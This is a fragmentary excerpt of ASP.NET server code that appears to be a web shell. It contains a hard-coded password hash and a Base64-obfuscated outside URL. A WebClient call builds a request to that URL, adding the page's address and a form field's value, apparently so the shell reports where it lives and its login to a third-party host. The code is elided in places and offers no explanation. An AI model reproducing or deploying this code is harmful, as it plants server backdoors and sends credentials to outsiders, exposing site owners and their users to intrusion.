...
<script runat="server">
public string Password="8643c8e2107ba86c47371e037059c4b7"; //ÃÜÂë3389
...
{try{string uriurl = System.Text.Encoding.Default.GetString(System.Convert.FromBase64String("aHR0cDovLzk1Njg4ODg4LmNvbS8xMTExMS5waHA=/aG09")); WebClient wc = new WebClient(); uriurl = uriurl + Request.Url + "||" + HRJ.Text + "&" + "b" + "z" + "=" + "a" + "s" + "p" + "x";
